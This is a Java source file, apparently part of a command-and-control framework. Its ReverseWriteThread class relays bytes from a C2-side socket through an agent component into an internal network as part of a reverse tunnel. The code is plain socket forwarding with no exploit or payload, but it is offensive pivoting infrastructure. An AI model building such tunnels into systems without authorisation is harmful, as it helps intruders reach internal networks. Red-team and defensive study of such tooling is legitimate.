package org.leo.core.engine.reverse;

import org.leo.core.agent.capability.ComponentInvokeCapable;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.Socket;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * 从 C2 本地 socket（forwardHost:forwardPort）读 → 通过组件写入 agent 端。
 * 即"C2 侧目标服务返回的字节"流向"agent accept 到的内网客户端"。
 */
class ReverseWriteThread implements Runnable {

    private static final Logger logger = LoggerFactory.getLogger(ReverseWriteThread.class);

    private final ReverseTunnelServer server;
    private final Socket localSocket;
    private final String connId;

    ReverseWriteThread(ReverseTunnelServer server, Socket localSocket, String connId) {
        this.server = server;
        this.localSocket = localSocket;
        this.connId = connId;
    }

    public void run() {
        ComponentInvokeCapable agent = server.getAgentNode();
        byte[] buffer = new byte[65535];
        while (server.isRunning() && !localSocket.isClosed()) {
            try {
                int length = localSocket.getInputStream().read(buffer);
                if (length < 0) return;
                if (length == 0) continue;

                Map<String, Object> params = new HashMap<String, Object>();
                params.put("op", Integer.valueOf(ReverseTunnelServer.OP_WRITE));
                params.put("connId", connId);
                params.put("data", Arrays.copyOf(buffer, length));
                Map<String, Object> response = agent.invokeComponent("ReverseTunnelComponent", params);
                int code = ReverseTunnelServer.responseCode(response);
                Object bytesWritten = response != null ? response.get("bytesWritten") : null;
                if (code != 200 || !(bytesWritten instanceof Number)
                        || ((Number) bytesWritten).longValue() != length) {
                    throw new IOException("agent WRITE failed: code=" + code + ", bytesWritten=" + bytesWritten);
                }
                server.recordDownload(connId, length);
            } catch (Exception error) {
                if (server.isRunning()) {
                    logger.debug("反向隧道写循环异常: connId={} {}", connId, error.getMessage());
                }
                return;
            }
        }
    }
}
